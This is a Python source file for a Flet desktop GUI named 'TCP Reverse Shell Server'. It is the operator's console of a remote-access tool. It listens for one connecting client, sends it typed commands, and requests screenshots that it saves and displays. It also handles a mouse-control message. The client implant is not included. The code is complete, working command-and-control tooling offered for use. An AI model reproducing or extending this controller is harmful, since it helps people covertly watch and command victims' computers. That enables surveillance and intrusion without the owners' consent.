import flet as ft
import socket
import threading

BUFFER = 2 ** 20  # Optimized buffer size

class ServerBackend:
    def __init__(self, ui_callback):
        self.server = None
        self.client = None
        self.client_address = None
        self.running = False
        self.counter = 0
        self.ui_callback = ui_callback  # Function to update UI

    def start_server(self, ip, port):
        self.ui_callback(f"Starting server on {ip}:{port}", "#5F8FA6")  # Dark pastel blue
        threading.Thread(target=self.create_server, args=(ip, port), daemon=True).start()

    def create_server(self, ip, port):
        self.server = socket.socket()
        self.server.bind((ip, port))
        self.server.listen()
        self.running = True

        self.client, self.client_address = self.server.accept()
        self.ui_callback(f"Connected to client: {self.client_address}", "#5F8FA6")  # Dark pastel blue

        while self.running:
            try:
                encoded_in = self.client.recv(BUFFER)
                if not encoded_in:
                    break  # Stop if no data received
                threading.Thread(target=self.handle_command, args=(encoded_in,), daemon=True).start()
            except Exception as ex:
                self.ui_callback(f"Error: {ex}", ft.Colors.RED)
                break

    def handle_command(self, encoded_in):
        try:
            decoded_in = encoded_in.decode()
            if decoded_in == "open":
                self.client.send(decoded_in.encode())
                self.ui_callback(f"Sent: {decoded_in}", "#5F8FA6")  # Dark pastel blue
                self.ui_callback("Waiting for page load...", "#5F8FA6")  # Dark pastel blue
            elif decoded_in == "page_loaded":
                self.ui_callback("Page loaded. Requesting screenshot...", "#5F8FA6")  # Dark pastel blue
                self.client.send("screenshot".encode())
                self.ui_callback("Sent: screenshot command", "#5F8FA6")  # Dark pastel blue
            elif decoded_in == "mouse con":
                self.ui_callback("Mouse control command received.", "#5F8FA6")  # Dark pastel blue
            else:
                self.ui_callback(f"Client: {decoded_in}", "#D1F1FF")  # Light cyan color
        except UnicodeDecodeError:
            screenshot_path = f"screenshot_{self.counter}.jpg"
            with open(screenshot_path, "wb") as img_file:
                img_file.write(encoded_in)
            self.ui_callback(f"Screenshot received and saved: {screenshot_path}", "#5F8FA6", screenshot_path)  # Dark pastel blue
            self.counter += 1

    def send_command(self, command):
        if not self.client:
            self.ui_callback("No client connected!", ft.Colors.RED)
            return
        self.client.send(command.encode())
        self.ui_callback(f"Sent to client: {command}", "#5F8FA6")  # Dark pastel blue

    def stop_server(self):
        self.running = False
        if self.client:
            self.client.close()
        if self.server:
            self.server.close()
        self.ui_callback("Server stopped.", ft.Colors.RED)


class ServerUI:
    def __init__(self, page: ft.Page):
        self.page = page
        self.page.title = "TCP Reverse Shell Server"
        self.page.theme_mode = "dark"
        self.page.bgcolor = "#1b1829"  # Set the background color of the page
        self.backend = ServerBackend(self.update_console)

        self.screenshot_column = ft.Column(scroll=ft.ScrollMode.ALWAYS, expand=True)  # Make screenshot column expand
        self.console_column = ft.Column(scroll=ft.ScrollMode.ALWAYS, expand=True)  # Add console column

        # IP and Port Fields for the AppBar
        self.ip_field = ft.TextField(
            value="127.0.0.1",
            prefix_icon=ft.Icons.LAN,
            hint_text="Enter server IP",
            autofocus=True,
            height=50,
            width=250,  # Increased width to make the text fields longer
            bgcolor="#4d4e63",  # Set to the desired color
            color=ft.Colors.WHITE  # Light text color
        )

        self.port_field = ft.TextField(
            value="6262",
            prefix_icon=ft.Icons.LOCK,
            hint_text="Enter port number",
            height=50,
            width=150,  # Increased width to make the text fields longer
            bgcolor="#4d4e63",  # Set to the desired color
            color=ft.Colors.WHITE  # Light text color
        )

        self.command_field = ft.TextField(
            label="Enter Command",
            expand=True,
            hint_text="Type your command here",
            autofocus=False,
            height=50,
            bgcolor="#996e40",  # Background color
            color=ft.Colors.WHITE,  # Light text color
            border_color="#B28D56",
            border_width=3
        )

        self.console = ft.Column(scroll=ft.ScrollMode.ALWAYS, expand=True)

        self.setup_ui()

    def setup_ui(self):
        # Modify AppBar to include IP and Port fields on the left side, next to the title
        self.page.appbar = ft.AppBar(
            title=ft.Text("TCP Reverse Shell Server", weight=ft.FontWeight.BOLD, color=ft.Colors.WHITE),
            center_title=False,  # Title is left-aligned
            bgcolor="#362f40",  # Set the AppBar background color to #362f40
            actions=[  # Row for IP and port fields
                ft.Row(
                    [
                        self.ip_field,
                        self.port_field
                    ],
                    alignment=ft.MainAxisAlignment.START,  # Align fields to the left
                    spacing=10
                ),
                ft.Row(
                    [
                        ft.IconButton(icon=ft.Icons.PLAY_ARROW, on_click=self.start_server, tooltip="Start Server", icon_color=ft.Colors.GREEN),
                        ft.IconButton(icon=ft.Icons.STOP, on_click=self.stop_server, tooltip="Stop Server", icon_color=ft.Colors.RED),
                        ft.Container(expand=True)  # Container added for spacing after the buttons
                    ],
                    alignment=ft.MainAxisAlignment.END,  # Align buttons to the right
                    spacing=10
                )
            ]
        )

        self.page.add(
            ft.Column(
                [
                    # Command Section below the AppBar
                    ft.Container(
                        ft.Row(
                            [
                                self.command_field,
                                ft.IconButton(icon=ft.Icons.SEND, on_click=self.send_command, tooltip="Send Command", icon_color=ft.Colors.WHITE)
                            ]
                        ),
                        padding=10,
                        border_radius=10,
                        # border=ft.border.all(2, "#5F8FA6"),  # Dark pastel blue
                        bgcolor="#694723"  # Background color of the container (the bar behind the text field)
                    ),

                    # Logs and Screenshot Section
                    ft.Row(
                        [
                            ft.Container(
                                content=ft.Column(
                                    [
                                        ft.Row(
                                            [
                                                ft.Text("Console Output", size=20, weight=ft.FontWeight.BOLD, color=ft.Colors.WHITE),
                                                ft.IconButton(
                                                    icon=ft.Icons.DELETE,
                                                    on_click=self.clear_console,
                                                    tooltip="Clear Console",
                                                    icon_color=ft.Colors.RED
                                                )
                                            ],
                                            alignment=ft.MainAxisAlignment.START,  # Align title to the left
                                            spacing=10
                                        ),
                                        self.console_column  # This column will show console output
                                    ]
                                ),
                                expand=1,  # Set console's expand value to 1 (thinner)
                                border=ft.border.all(2, ft.Colors.GREY_600),
                                padding=10,
                                bgcolor=ft.Colors.GREY_900.with_opacity(0.8, ft.Colors.GREY_900)  # Darker background for the console
                            ),
                            ft.Container(
                                content=ft.Column(
                                    [
                                        ft.Row(
                                            [
                                                ft.Text("Latest Screenshot", size=18, weight=ft.FontWeight.BOLD, color=ft.Colors.WHITE),
                                                ft.IconButton(
                                                    icon=ft.Icons.DELETE,
                                                    on_click=self.clear_screenshots,
                                                    tooltip="Clear Screenshots",
                                                    icon_color=ft.Colors.RED
                                                )
                                            ],
                                            alignment=ft.MainAxisAlignment.START,  # Align title to the left
                                            spacing=10
                                        ),
                                        self.screenshot_column  # Now this column will be used for latest screenshots
                                    ]
                                ),
                                expand=2,  # Set screenshot's expand value to 2 (wider)
                                border=ft.border.all(2, ft.Colors.GREY_600),
                                padding=10,
                                bgcolor=ft.Colors.GREY_900.with_opacity(0.8, ft.Colors.GREY_900)  # Darker background for the screenshot section
                            )
                        ],
                        expand=True
                    )
                ],
                expand=True
            )
        )
        self.page.update()

    def start_server(self, e):
        ip = self.ip_field.value
        port = int(self.port_field.value)
        self.backend.start_server(ip, port)

    def stop_server(self, e):
        self.backend.stop_server()

    def send_command(self, e):
        command = self.command_field.value
        self.backend.send_command(command)

    def clear_screenshots(self, e):
        self.screenshot_column.controls.clear()  # Clear the screenshot column
        self.page.update()  # Update the page to reflect the changes

    def clear_console(self, e):
        self.console_column.controls.clear()  # Clear the console output column
        self.page.update()  # Update the page to reflect the changes

    def update_console(self, message, color="#5F8FA6", image_path=None):  # Dark pastel blue
        # Add the console message to the console column
        self.console_column.controls.append(ft.Text(message, color=color))  # Add text to the console column
        self.page.update()  # Ensure the page updates after adding the message

        if image_path:
            # Add the new screenshot at the top of the screenshot column (no duplication here)
            self.screenshot_column.controls.insert(
                0,  # Insert at the top (index 0)
                ft.Image(src=image_path, fit=ft.ImageFit.CONTAIN, expand=True)  # Ensure the image expands
            )
            # Scroll to the top to show the latest screenshot
            self.screenshot_column.scroll = ft.ScrollMode.ALWAYS

        self.page.update()  # Make sure to refresh the page


def main(page: ft.Page):
    ServerUI(page)


if __name__ == "__main__":
    ft.app(target=main)
